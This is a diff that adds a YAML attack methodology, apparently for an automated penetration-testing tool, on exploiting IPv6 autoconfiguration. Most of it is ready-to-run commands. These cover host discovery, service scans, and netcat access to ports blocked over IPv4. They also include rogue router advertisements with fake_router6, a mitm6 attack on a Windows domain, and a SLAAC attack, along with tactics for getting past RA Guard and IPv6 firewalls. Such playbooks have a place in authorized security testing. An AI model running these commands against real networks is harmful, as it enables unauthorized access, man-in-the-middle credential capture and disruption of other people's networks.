@@ -1,0 +1,207 @@
+id: ipv6_autoconfiguration
+name: IPv6 Autoconfiguration Exploitation
+category: Network Protocol Exploit
+priority: high
+description: Exploit IPv6 SLAAC when IPv4 security controls don't apply.
+detailed_description: |
+  Exploit IPv6 Stateless Address Autoconfiguration (SLAAC) and the lack of IPv6 security controls
+  to bypass IPv4 restrictions and gain unauthorized network access through the IPv6 protocol stack.
+
+required_conditions:
+  - network_access
+  - ipv6_enabled
+
+optional_conditions:
+  - no_ipv6_filtering
+  - dual_stack_network
+  - ipv6_not_monitored
+
+tools:
+  - name: thc-ipv6
+    description: IPv6 attack toolkit
+    platform: linux
+  - name: nmap
+    description: Network scanner with IPv6 support
+    platform: all
+  - name: radvd
+    description: Router advertisement daemon
+    platform: linux
+
+phases:
+  - name: discovery
+    steps:
+      - id: check_ipv6_enabled
+        action: Check if IPv6 is active
+        command: |
+          ip -6 addr show
+          ping6 -c 2 ff02::1%{interface_name}
+
+      - id: discover_ipv6_hosts
+        action: Discover IPv6 hosts
+        command: |
+          # Multicast ping
+          ping6 -c 2 ff02::1%{interface_name}
+          # Using nmap
+          sudo nmap -6 --script=targets-ipv6-multicast-*
+        output_variables:
+          - ipv6_hosts
+          - link_local_addresses
+
+      - id: use_thc_alive
+        action: Use THC-IPv6 for host discovery
+        command: sudo alive6 {interface_name}
+        alternatives:
+          - shell: passive
+            command: sudo passive_discovery6 {interface_name}
+
+  - name: configuration
+    steps:
+      - id: enable_autoconf
+        action: Enable IPv6 autoconfiguration
+        command: |
+          sudo sysctl -w net.ipv6.conf.{interface_name}.autoconf=1
+          sudo sysctl -w net.ipv6.conf.{interface_name}.accept_ra=1
+
+      - id: force_ra_acceptance
+        action: Force router advertisement acceptance
+        command: sudo rdisc6 {interface_name}
+        output_variables:
+          - ipv6_prefix
+          - router_address
+          - dns_servers
+
+      - id: get_global_address
+        action: Obtain global IPv6 address
+        command: |
+          # Wait for SLAAC
+          sleep 5
+          ip -6 addr show {interface_name} | grep "scope global"
+
+  - name: exploitation
+    steps:
+      - id: scan_ipv6_services
+        action: Scan for IPv6 services
+        command: sudo nmap -6 -sT -p {port_range} {target_ipv6_address}
+        alternatives:
+          - shell: specific_ports
+            command: sudo nmap -6 -sT -p 22,80,443,445,3389 {target_ipv6_address}
+
+      - id: test_ipv6_access
+        action: Test IPv6 access to services
+        command: |
+          # SSH over IPv6
+          ssh {user}@{target_ipv6_address}%{interface_name}
+          # HTTP over IPv6
+          curl -6 http://[{target_ipv6_address}]:{port}
+          # SMB over IPv6
+          smbclient -L //[{target_ipv6_address}] -N
+
+      - id: bypass_ipv4_restrictions
+        action: Access services blocked on IPv4
+        command: |
+          # Service blocked on IPv4 but not IPv6
+          nc -6 {target_ipv6_address} {restricted_port}
+
+  - name: advanced_attacks
+    steps:
+      - id: rogue_ra
+        action: Send rogue router advertisements
+        command: |
+          sudo fake_router6 {interface_name} {attack_prefix}::/64
+        caution: Highly disruptive
+
+      - id: mitm6_attack
+        action: Perform mitm6 attack
+        command: |
+          sudo mitm6 -d {target_domain} -i {interface_name}
+        description: Exploit Windows IPv6 DNS preferences
+
+      - id: slaac_attack
+        action: SLAAC attack for addressing conflicts
+        command: |
+          sudo slaac_attack {interface_name}
+
+triggers:
+  on_complete:
+    - methodology: network_discovery
+      condition: ipv6_access_gained
+    - methodology: lateral_movement
+      condition: ipv6_services_found
+
+findings:
+  - id: ipv6_enabled_not_secured
+    title: IPv6 Enabled but Not Secured
+    severity: high
+    description: IPv6 stack enabled without security controls
+
+  - id: missing_ipv6_acls
+    title: Missing IPv6 ACLs
+    severity: high
+    description: Firewall rules not applied to IPv6 traffic
+
+  - id: no_ra_guard
+    title: No RA Guard Configured
+    severity: medium
+    description: Rogue router advertisements not prevented
+
+  - id: dual_stack_misconfiguration
+    title: Dual-Stack Misconfiguration
+    severity: medium
+    description: Security disparities between IPv4 and IPv6
+
+issues:
+  - symptom: IPv6 disabled on network
+    severity: low
+    causes:
+      - Administrator disabled IPv6
+      - Not a dual-stack network
+    resolutions:
+      - Focus on IPv4 attacks
+      - Check other interfaces
+      - Try different network segment
+
+  - symptom: RA Guard blocking
+    severity: medium
+    causes:
+      - Switch has RA Guard
+      - Only authorized routers allowed
+    resolutions:
+      - Try DHCPv6 attacks
+      - Focus on existing prefixes
+      - Attempt SLAAC attacks
+
+  - symptom: IPv6 firewall present
+    severity: medium
+    causes:
+      - ip6tables configured
+      - Stateful IPv6 filtering
+    resolutions:
+      - Enumerate allowed services
+      - Try tunneling techniques
+      - Look for misconfigurations
+
+cleanup:
+  - priority: medium
+    action: Disable IPv6 autoconfiguration
+    command: |
+      sudo sysctl -w net.ipv6.conf.{interface_name}.autoconf=0
+      sudo sysctl -w net.ipv6.conf.{interface_name}.accept_ra=0
+
+  - priority: low
+    action: Remove IPv6 addresses
+    command: |
+      # Remove all IPv6 addresses except link-local
+      sudo ip -6 addr flush dev {interface_name} scope global
+
+outcome_analysis:
+  success_indicators:
+    - IPv6 address obtained
+    - Services accessible via IPv6
+    - IPv4 restrictions bypassed
+    - Dual-stack misconfigurations found
+
+  failure_indicators:
+    - IPv6 disabled
+    - RA Guard configured
+    - IPv6 firewall blocking
+    - No dual-stack misconfiguration
